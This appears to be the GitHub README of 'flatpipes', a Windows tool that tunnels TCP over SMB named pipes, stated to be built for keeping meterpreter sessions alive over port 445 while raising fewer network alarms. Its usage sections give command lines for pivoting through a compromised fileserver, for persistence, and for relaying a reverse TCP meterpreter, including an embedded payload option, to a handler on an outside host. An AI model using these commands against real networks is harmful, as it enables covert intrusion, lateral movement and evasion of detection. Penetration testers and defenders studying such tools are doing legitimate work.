![Logo](https://github.com/dxflatline/misc/raw/master/flatpipes-help.png)

# flatpipes
A TCP proxy over named pipes. Originally created for maintaining a meterpreter session over 445 for less network alarms.

Since it seems it can help in various situations, let's list a few:


#### Usage - TCP 10001 Chat over Named Pipe

On the 1st Windows host (pipe server) we create two pipes "pipename_s2c" & "pipename_c2s" and as soon as pipe negotiation is ok, we open a TCP listener at 10001: 
```
flatpipes.exe pserver sserver pipename . 127.0.0.1 10001
```

On the 2nd Windows host (pipe client) we just connect to the pipe(s) created previously on the system X.X.X.X. As soon as we successfully connect, flatpipes open a listener on 10001 on this client machine too: 
```
flatpipes.exe pclient sserver pipename X.X.X.X 127.0.0.1 10001
```

Finally, netcat on the two hosts on their listeners and chat with yourself.


#### Usage - Bring a remote port here

Let's suppose you have access on the MS Fileserver (x.x.x.x) through a Windows "jumphost" workstation. You want to ensure all communications are over 445 since it is normal for workstation to DC. We need to access SSH on another system (y.y.y.y) in the Fileserver's LAN but we can only connect to MS Fileserver 445

On the MS Fileserver (x.x.x.x) we create our pipes for "IPC", and as soon as pipe negotiation is ok, it will TCP connect to the SSH server (y.y.y.y) in the LAN. All IO is through the flatpipes: 
```
flatpipes.exe pserver sclient pipename . y.y.y.y 22
```

On the jumphost we PIPE connect to the MS fileserver (x.x.x.x), and immediately spawn a TCP listener on localhost 22: 
```
flatpipes.exe pclient sserver pipename x.x.x.x 127.0.0.1 22
```

Just ssh on 127.0.0.1 22 from the jumphost  and you are through the town portal


#### Usage - Send a local port there

The reverse of the above example, useful to download additional tools through eg sftp

On the Server (x.x.x.x) we create our pipes for "IPC", and as soon as pipe negotiation is ok, it spawn a TCP listener on localhost 22: 
```
flatpipes.exe pserver sserver pipename . 127.0.0.1 22
```

On the jumphost we PIPE connect to the Server (x.x.x.x), and as soon as pipe negotiation is ok, it will TCP connect to our sFTP file repo (y.y.y.y). All IO is through the flatpipes: 
```
flatpipes.exe pclient sclient pipename x.x.x.x y.y.y.y 22
```

SSH on 127.0.0.1 22 from the Server


#### Usage - Reverse TCP meterpreter through pipes (own payload)

On the MS Fileserver (x.x.x.x) again and you want to maintain persistence, but over 445. You want reverse TCP meterpreter but also you want the jumphost to initiate the 445 connection.

On the MS Fileserver (x.x.x.x), we create two pipes and listen on 127.0.0.1 54321 for the reverse TCP meterpreter: 
```
flatpipes.exe pserver sserver pipename . 127.0.0.1 54321
```

On the jumphost we connect to the MS Fileserver (x.x.x.x) and immediately connect to the meterpreter handler: 
```
flatpipes.exe pclient sclient pipename x.x.x.x y.y.y.y 54321
```

What this means is that we can exchange directions, eg use a reverse exploitation, but make the opposite network traffic. It is like an encapsulation over DNS, just needs some familiarization.


#### Usage - Reverse TCP meterpreter through pipes (embedded payload)

Same as above but the reverse meter payload is embedded in the flatpipes

On the MS Fileserver (x.x.x.x), we create two pipes and listen on 127.0.0.1 54321 for the reverse TCP meterpreter. Note the "revmeter" keyword: 
```
flatpipes.exe pserver sserver pipename . 127.0.0.1 54321 revmeter
```

On the jumphost we connect to the MS Fileserver (x.x.x.x) and immediately connect to the meterpreter handler at y.y.y.y: 
```
flatpipes.exe pclient sclient pipename x.x.x.x y.y.y.y 54321
```

Important note: If you meterpreter listener in waiting on eg 12345 just use the following:
```
flatpipes.exe pserver sserver pipename . 127.0.0.1 54321 revmeter
flatpipes.exe pclient sclient pipename x.x.x.x y.y.y.y 12345
```
The first command with "monkey-patch" the meterpreter bytecode on-the-fly to make it locally connect to 54321. At the jumphost, the 12345 can be used without any interruption. It is like NAT'ting a port on a firewall

---

#### TODO
* Supports one connection, think of ways to do multiple connection handling
* Custom payload option (undecided on the transfer format b64?)
* Exception handling. Asap when pipe auth does not work

---

I hope it will help. Comments are welcome / looking for feedback.

<sub>PS: I don't know exactly (or have time to read) the details of CreateNamedPipe access controls. So I assume from MSDN that by using NULL security descriptor we allow RW access to Admins/System/Creator and R to everyone/anon. On the workstation that acts as a pipe client I test using eg *runas /user:server\tester /netonly "flatpipes.exe pclient sserver pipename X.X.X.X 127.0.0.1 10001"*. What happens with */netonly* is that you force an ntlm2 challenge response for all the pipe access requirements of the calls issued by flatpipes.</sub>
